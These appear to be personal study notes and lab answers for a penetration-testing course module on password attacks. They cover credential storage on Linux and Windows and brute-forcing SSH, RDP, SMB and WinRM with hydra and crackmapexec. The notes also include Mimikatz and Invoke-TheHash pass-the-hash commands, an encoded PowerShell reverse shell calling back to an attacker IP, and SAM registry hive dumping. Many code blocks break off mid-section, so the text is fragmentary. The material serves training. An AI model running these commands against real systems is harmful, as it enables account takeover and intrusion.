# Password Attacks

 This module will focus on attacking and bypassing the tenet of `Authentication` by compromising user passwords in many different operating systems, applications, and encryption types.
 
 Authentication, at its core, is the validation of your identity by presenting a combination of three main factors to a validation mechanism. They are;

1. Something you know (a password, passcode, pin, etc.).
2. Something you have (an ID Card, security key, or other MFA tools).
3. Something you are (your physical self, username, email address, or other identifiers.)

## Linux

Linux-based systems handle everything in the form of a file. Passwords are also stored encrypted in a file. This file is called the `shadow` file and is located in `/etc/shadow` and is part of the Linux user management system. In addition, these passwords are commonly stored in the form of `hashes`. An example can look like this:
#### Shadow File
```c
root@htb:~# cat /etc/shadow

...SNIP...
htb-student:$y$j9T$3QSBB6CbHEu...SNIP...f8Ms:18955:0:99999:7:::
```

The `/etc/shadow` file has a unique format in which the entries are entered and saved when new users are created.

||||||||||
|---|---|---|---|---|---|---|---|---|
|htb-student:|$y $j9T$3QSBB6CbHEu...SNIP...f8Ms:|18955:|0:|99999:|7:|:|:|:|
|`<username>`:|`<encrypted password>`:|`<day of last change>`:|`<min age>`:|`<max age>`:|`<warning period>`:|`<inactivity period>`:|`<expiration date>`:|`<reserved field>`|

The encryption of the password in this file is formatted as follows:

||||
|---|---|---|
|`$ <id>`|`$ <salt>`|`$ <hashed>`|
|`$ y`|`$ j9T`|`$ 3QSBB6CbHEu...SNIP...f8Ms`|

The type (`id`) is the cryptographic hash method used to encrypt the password. Many different cryptographic hash methods were used in the past and are still used by some systems today.

#### Passwd File

  Credential Storage

```c
r3so1v3@htb[/htb]$ cat /etc/passwd

...SNIP...
htb-student:x:1000:1000:,,,:/home/htb-student:/bin/bash
```

||||||||
|---|---|---|---|---|---|---|
|`htb-student:`|`x:`|`1000:`|`1000:`|`,,,:`|`/home/htb-student:`|`/bin/bash`|
|`<username>:`|`<password>:`|`<uid>:`|`<gid>:`|`<comment>:`|`<home directory>:`|`<cmd executed after logging in>`|

 The /etc/passwd file, contains information about Unix/Linux system users. This file does not store passwords explicitly, but provides information about users such as their names, user IDs (UIDS), group IDs (GIDs), home directory, and the shell used to log in. This is what the lines in the /etc/passwd file mean: 
 
 root:x:0:0:root:/root:/bin/bash 
 root: user name 
 x: The password is stored encrypted in the /etc/shadow file 
 0:0: UID and GID (both equal to 0 for superuser) 
 root: description or comment 
 /root: the user's home directory 
 /bin/bash: the command shell used to log in

The `x` in the password field indicates that the encrypted password is in the `/etc/shadow` file. However, the redirection to the `/etc/shadow` file does not make the users on the system invulnerable because if the rights of this file are set incorrectly, the file can be manipulated so that the user `root` does not need to type a password to log in. Therefore, an empty field means that we can log in with the username without entering a password.

## Windows Authentication Process

The [Local Security Authority](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection) (`LSA`) is a protected subsystem that authenticates users and logs them into the local computer. In addition, the LSA maintains information about all aspects of local security on a computer. It also provides various services for translating between names and security IDs (`SIDs`).
![](https://i.imgur.com/AfN47Qy.png)

Local interactive logon is performed by the interaction between the logon process ([WinLogon](https://www.microsoftpressstore.com/articles/article.aspx?p=2228450&seqNum=8)), the logon user interface process (`LogonUI`), the `credential providers`, `LSASS`, one or more `authentication packages`, and `SAM` or `Active Directory`. Authentication packages, in this case, are the Dynamic-Link Libraries (`DLLs`) that perform authentication checks. For example, for non-domain joined and interactive logins, the authentication package `Msv1_0.dll` is used.

`Winlogon` is a trusted process responsible for managing security-related user interactions. These include:

- Launching LogonUI to enter passwords at login
    
- Changing passwords
    
- Locking and unlocking the workstation

#### LSASS

[Local Security Authority Subsystem Service](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service) (`LSASS`) is a collection of many modules and has access to all authentication processes that can be found in `%SystemRoot%\System32\Lsass.exe`. This service is responsible for the local system security policy, user authentication, and sending security audit logs to the `Event log`. In other words, it is the vault for Windows-based operating systems.

| **Authentication Packages** | **Description**                                                                                                                                                                                                                                                |
| --------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Lsasrv.dll`                | The LSA Server service both enforces security policies and acts as the security package manager for the LSA. The LSA contains the Negotiate function, which selects either the NTLM or Kerberos protocol after determining which protocol is to be successful. |
| `Msv1_0.dll`                | Authentication package for local machine logons that don't require custom authentication.                                                                                                                                                                      |
| `Samsrv.dll`                | The Security Accounts Manager (SAM) stores local security accounts, enforces locally stored policies, and supports APIs.                                                                                                                                       |
| `Kerberos.dll`              | Security package loaded by the LSA for Kerberos-based authentication on a machine.                                                                                                                                                                             |
| `Netlogon.dll`              | Network-based logon service.                                                                                                                                                                                                                                   |
| `Ntdsa.dll`                 | This library is used to create new records and folders in the Windows registry.                                                                                                                                                                                |

Each interactive logon session creates a separate instance of the Winlogon service. The [Graphical Identification and Authentication](https://docs.microsoft.com/en-us/windows/win32/secauthn/gina) (`GINA`) architecture is loaded into the process area used by Winlogon, receives and processes the credentials, and invokes the authentication interfaces via the [LSALogonUser](https://docs.microsoft.com/en-us/windows/win32/api/ntsecapi/nf-ntsecapi-lsalogonuser) function.

#### SAM Database

The [Security Account Manager](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc756748(v=ws.10)?redirectedfrom=MSDN) (`SAM`) is a database file in Windows operating systems that stores users' passwords. It can be used to authenticate local and remote users. SAM uses cryptographic measures to prevent unauthenticated users from accessing the system. User passwords are stored in a hash format in a registry structure as either an `LM` hash or an `NTLM` hash. This file is located in `%SystemRoot%/system32/config/SAM` and is mounted on HKLM/SAM. SYSTEM level permissions are required to view it.

#### Credential Manager
![](https://i.imgur.com/2yXg7oz.png)

Credential Manager is a feature built-in to all Windows operating systems that allows users to save the credentials they use to access various network resources and websites. Saved credentials are stored based on user profiles in each user's `Credential Locker`. Credentials are encrypted and stored at the following location:
```c
PS C:\Users\[Username]\AppData\Local\Microsoft\[Vault/Credentials]\
```

#### NTDS

It is very common to come across network environments where Windows systems are joined to a Windows domain. This is common because it makes it easier for admins to manage all the systems owned by their respective organizations (centralized management). In these cases, the Windows systems will send all logon requests to Domain Controllers that belong to the same Active Directory forest. Each Domain Controller hosts a file called `NTDS.dit` that is kept synchronized across all Domain Controllers with the exception of [Read-Only Domain Controllers](https://docs.microsoft.com/en-us/windows/win32/ad/rodc-and-active-directory-schema). NTDS.dit is a database file that stores the data in Active Directory, including but not limited to:

- User accounts (username & password hash)
- Group accounts
- Computer accounts
- Group policy objects

## John The Ripper
John the Ripper (JTR or john) is an essential pentesting tool used to check the strength of passwords and crack encrypted (or hashed) passwords using either brute force or dictionary attacks.

## Cracking Modes

`Single Crack Mode` is one of the most common John modes used when attempting to crack passwords using a single password list. It is a brute-force attack, meaning all passwords on the list are tried, one by one, until the correct one is found. This method is the most basic and straightforward way of cracking passwords and is thus a popular choice for those wishing to gain access to a secure system. It is, however, far from the most efficient method since it can take an indefinite amount of time to crack a password, depending on the length and complexity of the password in question. The basic syntax for the command is:
#### Single Crack Mode
```c
r3so1v3@htb[/htb]$ john --format=<hash_type> <hash or hash_file>
```

For example, if we have a file named `hashes_to_crack.txt` that contains `SHA-256` hashes, the command to crack them would be:
```c
r3so1v3@htb[/htb]$ john --format=sha256 hashes_to_crack.txt
```

#### Wordlist Mode

`Wordlist Mode` is used to crack passwords using multiple lists of words. It is a dictionary attack which means it will try all the words in the lists one by one until it finds the right one. It is generally used for cracking multiple password hashes using a wordlist or a combination of wordlists. It is more effective than Single Crack Mode because it utilizes more words but is still relatively basic. The basic syntax for the command is:
```c
r3so1v3@htb[/htb]$ john --wordlist=<wordlist_file> --rules <hash_file>
```

#### Incremental Mode

`Incremental Mode` is an advanced John mode used to crack passwords using a character set. It is a hybrid attack, which means it will attempt to match the password by trying all possible combinations of characters from the character set. This mode is the most effective yet most time-consuming of all the John modes. This mode works best when we know what the password might be, as it will try all the possible combinations in sequence, starting from the shortest one.
```c
r3so1v3@htb[/htb]$ john --incremental <hash_file>
```

It is also possible to crack even password-protected or encrypted files with John. We use additional tools that process the given files and produce hashes that John can work with. It automatically detects the formats and tries to crack them. The syntax for this can look like this:
#### Cracking Files with John
```c
cry0l1t3@htb:~$ <tool> <file_to_crack> > file.hash
cry0l1t3@htb:~$ pdf2john server_doc.pdf > server_doc.hash
cry0l1t3@htb:~$ john server_doc.hash
                # OR
cry0l1t3@htb:~$ john --wordlist=<wordlist.txt> server_doc.hash 
```

Additionally, we can use different modes for this with our personal wordlists and rules. We have created a list that includes many but not all tools that can be used for John:

| **Tool**                | **Description**                               |
| ----------------------- | --------------------------------------------- |

## WinRM

[Windows Remote Management](https://docs.microsoft.com/en-us/windows/win32/winrm/portal) (`WinRM`) is the Microsoft implementation of the network protocol [Web Services Management Protocol](https://docs.microsoft.com/en-us/windows/win32/winrm/ws-management-protocol) (`WS-Management`). It is a network protocol based on XML web services using the [Simple Object Access Protocol](https://docs.microsoft.com/en-us/windows/win32/winrm/windows-remote-management-glossary) (`SOAP`) used for remote management of Windows systems. It takes care of the communication between [Web-Based Enterprise Management](https://en.wikipedia.org/wiki/Web-Based_Enterprise_Management) (`WBEM`) and the [Windows Management Instrumentation](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page) (`WMI`), which can call the [Distributed Component Object Model](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/4a893f3d-bd29-48cd-9f43-d9777a4415b0) (`DCOM`).

#### CrackMapExec
A handy tool that we can use for our password attacks.
```c
r3so1v3@htb[/htb]$ crackmapexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>
```

```c
r3so1v3@htb[/htb]$ crackmapexec winrm 10.129.42.197 -u user.list -p password.list

WINRM       10.129.42.197   5985   NONE             [*] None (name:10.129.42.197) (domain:None)

WINRM       10.129.42.197   5985   NONE             [+] None\user:password (Pwn3d!)
```

#### Evil-WinRM
Another handy tool that we can use to communicate with the WinRM service:
```c
r3so1v3@htb[/htb]$ evil-winrm -i <target-IP> -u <username> -p <password>
```

```c
r3so1v3@htb[/htb]$ evil-winrm -i 10.129.42.197 -u user -p password

## SSH

[Secure Shell](https://www.ssh.com/academy/ssh/protocol) (`SSH`) is a more secure way to connect to a remote host to execute system commands or transfer files from a host to a server. The SSH server runs on `TCP port 22` by default, to which we can connect using an SSH client. This service uses three different cryptography operations/methods: `symmetric` encryption, `asymmetric` encryption, and `hashing`.

#### Symmetric Encryption

Symmetric encryption uses the `same key` for encryption and decryption. However, anyone who has access to the key could also access the transmitted data. Therefore, a key exchange procedure is needed for secure symmetric encryption. The [Diffie-Hellman](https://en.wikipedia.org/wiki/Diffie%E2%80%93Hellman_key_exchange) key exchange method is used for this purpose. If a third party obtains the key, it cannot decrypt the messages because the key exchange method is unknown. However, this is used by the server and client to determine the secret key needed to access the data. Many different variants of the symmetrical cipher system can be used, such as AES, Blowfish, 3DES, etc.

#### Asymmetrical Encryption

Asymmetric encryption uses `two SSH keys`: a private key and a public key. The private key must remain secret because only it can decrypt the messages that have been encrypted with the public key. If an attacker obtains the private key, which is often not password protected, he will be able to log in to the system without credentials. Once a connection is established, the server uses the public key for initialization and authentication. If the client can decrypt the message, it has the private key, and the SSH session can begin.

#### Hashing

The hashing method converts the transmitted data into another unique value. SSH uses hashing to confirm the authenticity of messages. This is a mathematical algorithm that only works in one direction.

#### Hydra - SSH

We can use a tool such as `Hydra` to brute force SSH. 
```c
r3so1v3@htb[/htb]$ hydra -L user.list -P password.list ssh://10.129.42.197

```

## Remote Desktop Protocol (RDP)

Microsoft's [Remote Desktop Protocol](https://docs.microsoft.com/en-us/troubleshoot/windows-server/remote/understanding-remote-desktop-protocol) (`RDP`) is a network protocol that allows remote access to Windows systems via `TCP port 3389` by default. RDP provides both users and administrators/support staff with remote access to Windows hosts within an organization

#### Hydra - RDP

We can also use `Hydra` to perform RDP bruteforcing.
```c
r3so1v3@htb[/htb]$ hydra -L user.list -P password.list rdp://10.129.42.197

## SMB

[Server Message Block](https://docs.microsoft.com/en-us/windows/win32/fileio/microsoft-smb-protocol-and-cifs-protocol-overview) (`SMB`) is a protocol responsible for transferring data between a client and a server in local area networks. It is used to implement file and directory sharing and printing services in Windows networks. SMB is often referred to as a file system, but it is not. SMB can be compared to `NFS` for Unix and Linux for providing drives on local networks.

SMB is also known as [Common Internet File System](https://cifs.com/) (`CIFS`). It is part of the SMB protocol and enables universal remote connection of multiple platforms such as Windows, Linux, or macOS. In addition, we will often encounter [Samba](https://wiki.samba.org/index.php/Main_Page), which is an open-source implementation of the above functions. For SMB, we can also use `hydra` again to try different usernames in combination with different passwords.

#### Hydra - SMB
```c
r3so1v3@htb[/htb]$ hydra -L user.list -P password.list smb://10.129.42.197

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

## Attacking SAM


## Attacking LSASS

In addition to getting copies of the SAM database to dump and crack hashes, we will also benefit from targeting LSASS. As discussed in the Credential Storage section of this module, LSASS is a critical service that plays a central role in credential management and the authentication processes in all Windows operating systems.

Upon initial logon, LSASS will:

    Cache credentials locally in memory
    Create access tokens
    Enforce security policies
    Write to Windows security log

### Linux log files directories
```
Log File 	Description
/var/log/messages 	Generic system activity logs.
/var/log/syslog 	Generic system activity logs.
/var/log/auth.log 	(Debian) All authentication related logs.
/var/log/secure 	(RedHat/CentOS) All authentication related logs.
/var/log/boot.log 	Booting information.
/var/log/dmesg 	Hardware and drivers related information and logs.
/var/log/kern.log 	Kernel related warnings, errors and logs.
/var/log/faillog 	Failed login attempts.
/var/log/cron 	Information related to cron jobs.
/var/log/mail.log 	All mail server related logs.
/var/log/httpd 	All Apache related logs.
/var/log/mysqld.log 	All MySQL server related logs.
```

Where we can get creds in linux for priv esc after establishing foothold:
```
| Files | History | Memory | Key-Rings |

| Configs | Logs | Cache | Browser stored credentials |
| Databases | Command-line History | In-memory Processing |
| Notes |
| Scripts |
| Source codes |
| Cronjobs |
| SSH Keys |
```

#### Passwd File

The /etc/passwd file contains information about every existing user on the system and can be read by all users and services. Each entry in the /etc/passwd file identifies a user on the system. Each entry has seven fields containing a form of a database with information about the particular user, where a colon (:) separates the information. Accordingly, such an entry may look something like this:
![](https://i.imgur.com/UTrXYNp.png)

Usually, we find the value x in this field, which means that the passwords are stored in an encrypted form in the /etc/shadow file. However, it can also be that the /etc/passwd file is writeable by mistake. This would allow us to clear this field for the user root so that the password info field is empty. This will cause the system not to send a password prompt when a user tries to log in as root.
Editing /etc/passwd - Before
Passwd, Shadow & Opasswd
```
root:x:0:0:root:/root:/bin/bash
```

Editing /etc/passwd - After
Passwd, Shadow & Opasswd
```
root::0:0:root:/root:/bin/bash
```

Root without Password
Passwd, Shadow & Opasswd
```c
[cry0l1t3@parrot]─[~]$ head -n 1 /etc/passwd
root::0:0:root:/root:/bin/bash

[cry0l1t3@parrot]─[~]$ su
[root@parrot]─[/home/cry0l1t3]#
```

#### Shadow File

Since reading the password hash values can put the entire system in danger, the file /etc/shadow was developed, which has a similar format to /etc/passwd but is only responsible for passwords and their management. It contains all the password information for the created users. For example, if there is no entry in the /etc/shadow file for a user in /etc/passwd, the user is considered invalid.

#### Pass the Hash (PtH)

A Pass the Hash (PtH) attack is a technique where an attacker uses a password hash instead of the plain text password for authentication. The attacker doesn't need to decrypt the hash to obtain a plaintext password. PtH attacks exploit the authentication protocol, as the password hash remains static for every session until the password is changed.

The attacker must have administrative privileges or particular privileges on the target machine to obtain a password hash. Hashes can be obtained in several ways, including:

    Dumping the local SAM database from a compromised host.
    Extracting hashes from the NTDS database (ntds.dit) on a Domain Controller.
    Pulling the hashes from memory (lsass.exe).

 Microsoft's Windows New Technology LAN Manager (NTLM) is a set of security protocols that authenticates users' identities while also protecting the integrity and confidentiality of their data. NTLM is a single sign-on (SSO) solution that uses a challenge-response protocol to verify the user's identity without having them provide a password.

The first tool we will use to perform a Pass the Hash attack is Mimikatz. Mimikatz has a module named sekurlsa::pth that allows us to perform a Pass the Hash attack by starting a process using the hash of the user's password. To use this module, we will need the following:

    /user - The user name we want to impersonate.
    /rc4 or /NTLM - NTLM hash of the user's password.
    /domain - Domain the user to impersonate belongs to. In the case of a local user account, we can use the computer name, localhost, or a dot (.).
    /run - The program we want to run with the user's context (if not specified, it will launch cmd.exe).

##### Pass the Hash from Windows Using Mimikatz:
```c
c:\tools> mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
user    : julio
domain  : inlanefreight.htb
program : cmd.exe
impers. : no
NTLM    : 64F12CDDAA88057E06A81B54E73B949B
  |  PID  8404
  |  TID  4268
  |  LSA Process was already R/W
  |  LUID 0 ; 5218172 (00000000:004f9f7c)
  \_ msv1_0   - data copy @ 0000028FC91AB510 : OK !
  \_ kerberos - data copy @ 0000028FC964F288
   \_ des_cbc_md4       -> null
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ *Password replace @ 0000028FC9673AE8 (32) -> null
```

Now we can use cmd.exe to execute commands in the user's context. For this example, julio can connect to a shared folder named julio on the DC.

#### Pass the Hash with PowerShell Invoke-TheHash (Windows)

Another tool we can use to perform Pass the Hash attacks on Windows is Invoke-TheHash. This tool is a collection of PowerShell functions for performing Pass the Hash attacks with WMI and SMB. WMI and SMB connections are accessed through the .NET TCPClient. Authentication is performed by passing an NTLM hash into the NTLMv2 authentication protocol. Local administrator privileges are not required client-side, but the user and hash we use to authenticate need to have administrative rights on the target computer. For this example we will use the user julio and the hash 64F12CDDAA88057E06A81B54E73B949B.

When using Invoke-TheHash, we have two options: SMB or WMI command execution. To use this tool, we need to specify the following parameters to execute commands in the target computer:

    Target - Hostname or IP address of the target.
    Username - Username to use for authentication.
    Domain - Domain to use for authentication. This parameter is unnecessary with local accounts or when using the @domain after the username.
    Hash - NTLM password hash for authentication. This function will accept either LM:NTLM or NTLM format.
    Command - Command to execute on the target. If a command is not specified, the function will check to see if the username and hash have access to WMI on the target.

The following command will use the SMB method for command execution to create a new user named mark and add the user to the Administrators group.

##### Invoke-TheHash with SMB
```c
PS c:\htb> cd C:\tools\Invoke-TheHash\
PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
PS c:\tools\Invoke-TheHash> Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose

VERBOSE: [+] inlanefreight.htb\julio successfully authenticated on 172.16.1.10
VERBOSE: inlanefreight.htb\julio has Service Control Manager write privilege on 172.16.1.10
VERBOSE: Service EGDKNNLQVOLFHRQTQMAU created on 172.16.1.10

[+] Command executed with service EGDKNNLQVOLFHRQTQMAU on 172.16.1.10
VERBOSE: Service EGDKNNLQVOLFHRQTQMAU deleted on 172.16.1.10
```
We can also get a reverse shell connection in the target machine.
To get a reverse shell, we need to start our listener using Netcat on our Windows machine, which has the IP address 172.16.1.5. We will use port 8001 to wait for the connection.
##### Netcat Listener
```c
PS C:\tools> .\nc.exe -lvnp 8001
listening on [any] 8001 ...

```
To create a simple reverse shell using PowerShell, we can visit https://www.revshells.com/, set our IP 172.16.1.5 and port 8001, and select the option PowerShell #3 (Base64), as shown in the following image.
![](https://i.imgur.com/iLKBclf.png)
Now we can execute Invoke-TheHash to execute our PowerShell reverse shell script in the target computer. Notice that instead of providing the IP address, which is 172.16.1.10, we will use the machine name DC01 (either would work).
##### Invoke-TheHash with WMI
```c
PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
PS c:\tools\Invoke-TheHash> Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMwAzACIALAA4ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="

```

The result is the reverse shell connection from DS01 host (172.16.1.10).

#### Pass the Hash with Impacket (Linux)

Impacket has several tools we can use for different operations such as Command Execution and Credential Dumping, Enumeration, etc. For this example, we will perform command execution on the target machine using PsExec.
##### Pass the Hash with Impacket PsExec
```c
r3so1v3@htb[/htb]$ impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453

### Pass The Ticket
Method for moving laterally in an Active Directory environment is called a [Pass the Ticket (PtT) attack](https://attack.mitre.org/techniques/T1550/003/). In this attack, we use a stolen Kerberos ticket to move laterally instead of an NTLM password hash

#### Kerberos Protocol Refresher

The Kerberos authentication system is ticket-based. The central idea behind Kerberos is not to give an account password to every service you use. Instead, Kerberos keeps all tickets on your local system and presents each service only the specific ticket for that service, preventing a ticket from being used for another purpose.

- The `TGT - Ticket Granting Ticket` is the first ticket obtained on a Kerberos system. The TGT permits the client to obtain additional Kerberos tickets or `TGS`.
- The `TGS - Ticket Granting Service` is requested by users who want to use a service. These tickets allow services to verify the user's identity.

When a user requests a `TGT`, they must authenticate to the domain controller by encrypting the current timestamp with their password hash. Once the domain controller validates the user's identity (because the domain knows the user's password hash, meaning it can decrypt the timestamp), it sends the user a TGT for future requests. Once the user has their ticket, they do not have to prove who they are with their password.

If the user wants to connect to an MSSQL database, it will request a Ticket Granting Service (TGS) to The Key Distribution Center (KDC), presenting its Ticket Granting Ticket (TGT). Then it will give the TGS to the MSSQL database server for authentication.

## Kerberos on Linux

Windows and Linux use the same process to request a Ticket Granting Ticket (TGT) and Service Ticket (TGS). However, how they store the ticket information may vary depending on the Linux distribution and implementation.

In most cases, Linux machines store Kerberos tickets as [ccache files](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) in the `/tmp` directory. By default, the location of the Kerberos ticket is stored in the environment variable `KRB5CCNAME`. This variable can identify if Kerberos tickets are being used or if the default location for storing Kerberos tickets is changed. These [ccache files](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) are protected by reading and write permissions, but a user with elevated privileges or root privileges could easily gain access to these tickets.

**Note:** A computer account needs a ticket to interact with the Active Directory environment in windows. Similarly, a Linux domain joined machine needs a ticket. The ticket is represented as a keytab file located by default at `/etc/krb5.keytab` and can only be read by the root user. If we gain access to this ticket, we can impersonate the computer account LINUX01$.INLANEFREIGHT.HTB

#### Main differences between keytab and ccache

# Questions & Answers
### Network Services

1.  Find the user for the WinRM service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.

First downloaded the zip file from resources in the top of htb academy page then unzip them
```c
crackmapexec winrm <ip> -u user.list -p password.list
```
Found password and user: john:november so we need to log in:
```c
crackmapexec winrm <ip> -u user.list -p password.list
```
After logging in go to desktop of the user:
```c
*Evil-WinRM* PS C:\Users\john> cd Desktop
*Evil-WinRM* PS C:\Users\john\Desktop> dir

    Directory: C:\Users\john\Desktop

3. Find the user for the RDP service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.
```c
hydra -L username.list -P password.list rdp://10.129.212.54
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-08-11 21:41:09

[3389][rdp] host: 10.129.212.54   login: chris   password: 789456123
[ERROR] freerdp: The connection failed to establish.
```

So our creds: chris:789456123
We will rdp with xfreerdp to get flag:
```c
xfreerdp /v:10.129.212.54 /u:chris /p:789456123
```

4. Find the user for the SMB service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.
```c
hydra -L username.list -P password.list smb://10.129.212.54
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

```
So Error here is because we most likely have an outdated version of THC-Hydra that cannot handle SMBv3 replies. To work around this problem, we can manually update and recompile hydra or use another very powerful tool, the Metasploit framework.
```c
msfconsole -q

[msf](Jobs:0 Agents:0) auxiliary(scanner/smb/smb_login) >> set user_file username.list

pass_file => password.list

### Password Mutations

5. Create a mutated wordlist using the files in the ZIP file under "Resources" in the top right corner of this section. Use this wordlist to brute force the password for the user "sam". Once successful, log in with SSH and submit the contents of the flag.txt file as your answer. 

First we need to create a muted password list with custom.rule file
```c
hashcat --force password.list -r custom.rule --stdout > mut_password.list
```

HINT for not wasting hours in bruteforce. The password for "sam" is going to be related to Batman ;)
```c
nano batman.list
```

And in batman.list we initially add batman and that's it, we close this file and save
Then we need to mutate it:
```c
hashcat --force batman.list -r custom.rule --stdout > mut_batman.list
```

And finally start to bruteforce using hydra:
```c
hydra -l sam -P mut_batman.list ssh://10.129.202.64

[22][ssh] host: 10.129.202.64   login: sam   password: B@tm@n2022!
1 of 1 target successfully completed, 1 valid password found
```

This took me 15 min to scan, can't imagine how long would it take if you don't know that it is related to batman:
So as we obtained password: B@tm@n2022! we can ssh to "sam" with it:
```c
ssh sam@10.129.202.64
```

And flag is in the smb folder


### Password Reuse / Default Passwords

6.  Use the user's credentials we found in the previous section and find out the credentials for MySQL. Submit the credentials as the answer. 
(Format: username:password)

First we need to download cheatsheet: https://github.com/ihebski/DefaultCreds-cheat-sheet
```c
grep 'SQL' DefaultCreds-Cheat-Sheet.csv

IBM,SQLDBA,<blank>
IBM,SQLUSER,<blank>
MSSQL (mssql),ADONI,BPMS
MSSQL (mssql),sa,<blank>
MSSQL (mssql),sa,password
MSSQL (mssql),sa,Password123
MSSQL (mssql),sa,sa
MSSQL (mssql),sa,sqlserver
MySQL,admin@example.com,admin
MySQL,root,<blank>
MySQL (ssh),root,root
MySQL,superdba,admin
Oracle,PLSQL,SUPERSECRET
Pelco DS SQL (v7.x.x),sa,LETmein333
PostgreSQL,postgres,<blank>
Scrutinizer (MySQL),scrutremote,admin
Sybase,DBA,SQL
Wedge Networks (SQL DB),root,wecandoit
```

The username and password are: superdba:admin

Then using the creds for sam, ssh to sam again:
```c
cat foundusers.list 
john:november
dennis:rockstar
chris:789456123

sam@10.129.202.64's password:B@tm@n2022!
```

Here we use password: admin to log in to database, that's mean that above default creds worked:
```c
sam@nix01:~$ mysql -u superdba -p

### Attacking SAM

7. Where is the SAM database located in the Windows registry? (Format: ****\***) 
hklm\\sam

8. Apply the concepts taught in this section to obtain the password to the ITbackdoor user account on the target. Submit the clear-text password as the answer.

So firstly we need to RDP to the windows machine via xfreerdp:
```c
xfreerdp /v:10.129.202.137 /u:Bob /p:HTB_@cademy_stdnt!
```

After that we will have an active session of Windows 10. We need to click search bar in the taskbar, down-left corner, and type terminal, to run it as administrator
Then we need to enter one-by-one the following commands:
```c
C:\Windows\system32>reg.exe save hklm\sam C:\sam.save
The operation completed successfully.

C:\Windows\system32>reg.exe save hklm\system C:\system.save
The operation completed successfully.

C:\Windows\system32>reg.exe save hklm\security C:\security.save
The operation completed successfully.

C:\Windows\system32>dir c:\
 Volume in drive C has no label.
 Volume Serial Number is C41A-F2ED

 Directory of c:\

12/14/2020  08:22 PM    <DIR>          PerfLogs
02/08/2022  12:17 PM    <DIR>          Program Files
02/08/2022  12:17 PM    <DIR>          Program Files (x86)
09/19/2024  11:08 AM            65,536 sam.save
09/19/2024  11:09 AM            40,960 security.save
09/19/2024  11:08 AM        12,800,000 system.save
